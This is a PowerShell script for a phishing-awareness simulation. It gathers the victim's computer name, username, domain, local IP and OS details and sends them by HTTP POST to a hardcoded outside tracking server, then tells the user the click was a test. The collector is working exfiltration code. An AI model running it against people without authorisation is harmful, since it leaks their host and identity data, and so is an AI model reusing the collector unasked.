# Phishing Simulation - PC Info Collector (PowerShell)
# This script collects system info and sends to the tracking server
# For legitimate security awareness testing only

param(
    [string]$ServerUrl = "https://patrickcorr.me:8888",
    [string]$CampaignId = "default"
)

# Collect system information
$SystemInfo = @{
    computerName = $env:COMPUTERNAME
    username = $env:USERNAME
    userDomain = $env:USERDOMAIN
    localIp = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike "127.*"} | Select-Object -First 1).IPAddress
    osVersion = (Get-CimInstance Win32_OperatingSystem).Caption
    architecture = $env:PROCESSOR_ARCHITECTURE
    timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    campaignId = $CampaignId
}

# Convert to JSON
$JsonBody = $SystemInfo | ConvertTo-Json

# Send to tracking server
try {
    $Response = Invoke-RestMethod -Uri "$ServerUrl/collect.php" `
        -Method POST `
        -ContentType "application/json" `
        -Body $JsonBody `
        -UseBasicParsing `
        -TimeoutSec 10
    
    Write-Host "Information sent successfully." -ForegroundColor Green
    Write-Host "This was a security awareness test. Please report suspicious emails to IT."
} catch {
    Write-Host "Could not connect to tracking server." -ForegroundColor Yellow
}

# Optional: Show a message to the user
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show(
    "This was a simulated phishing test. You clicked a link you shouldn't have.`n`nIn a real attack, your PC information would now be compromised:`n`nComputer: $($SystemInfo.computerName)`nUser: $($SystemInfo.userDomain)\\$($SystemInfo.username)`n`nPlease complete the security awareness training.",
    "Security Awareness Test",
    "OK",
    "Warning"
)
